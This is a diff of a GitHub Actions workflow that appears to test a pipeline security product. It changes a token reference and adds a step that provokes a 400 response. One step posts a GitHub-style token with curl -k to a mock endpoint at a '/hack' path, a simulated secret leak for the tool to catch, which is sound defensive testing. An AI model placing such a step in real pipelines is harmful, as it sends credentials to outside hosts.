@@ -17,7 +17,7 @@ jobs:
         uses: invisirisk/pse-action@latest
         with:
           api_url: "https://app.invisirisk.com"
-          app_token: ${{ secrets.IR_API_KEY_PROD_BLOCK }}
+          app_token: ${{ secrets.IR_API_KEY_PROD_DSP }}
           
       - uses: actions/checkout@v4
 
@@ -29,13 +29,16 @@ jobs:
       - name: Install dependencies
         run: pip install -r requirements.txt
         
-      - name: Secret Leak
+      - name: Secret Leak Policy
         run: |
           curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
             -H "Content-Type: application/json" \
             -d '{
             "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
           }'
+
+      - name: Response Status Code Policy (Trigger 400 Bad Request)
+        run: curl -k -X POST https://api.github.com/endpoint
         
       - name: Cleanup PSE
         if: always()
